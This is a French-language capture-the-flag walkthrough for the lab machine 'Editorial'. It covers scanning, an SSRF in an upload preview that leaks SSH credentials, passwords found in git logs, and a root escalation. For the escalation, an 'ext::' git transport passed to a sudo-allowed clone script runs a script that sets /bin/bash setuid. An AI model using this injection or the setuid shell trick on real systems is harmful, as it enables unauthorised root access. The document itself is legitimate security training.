# Editorial

	echo "10.10.11.20 editorial.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.20 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.20 -oN nmap.txt
	feroxbuster --silent -u http://editorial.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)

Chemins : 

    http://editorial.htb/upload
    http://editorial.htb/about
    http://editorial.htb/static/css/bootstrap.min.css
    http://editorial.htb/static/images/pexels-min-an-694740.jpg
    http://editorial.htb/static/images/pexels-janko-ferlic-590493.jpg
    http://editorial.htb/upload-cover
    http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg


http://editorial.htb/upload => SSRF sur la fonction "Preview" qui envoie une requête "POST /upload-cover HTTP/1.1"


http://127.0.0.1:5000/api/latest/metadata/messages/authors => Credentials SSH pour le compte "dev"

	ssh dev@10.10.11.20
	cat user.txt	 

## Pivoting

Credentials du compte "prod" dans des logs : 

    cat /home/dev/apps/.git/logs/d
    ssh prod@10.10.11.20

## Élévation de privilèges

	sudo -l
    
> (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *


Programme qui clone une URL.

    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/exp.sh'
    /bin/bash -p 
    cat /root/root.txt

Exemple de contenu pour exp.sh : 

    #!/bin/bash
    chmod 4777 /bin/bash
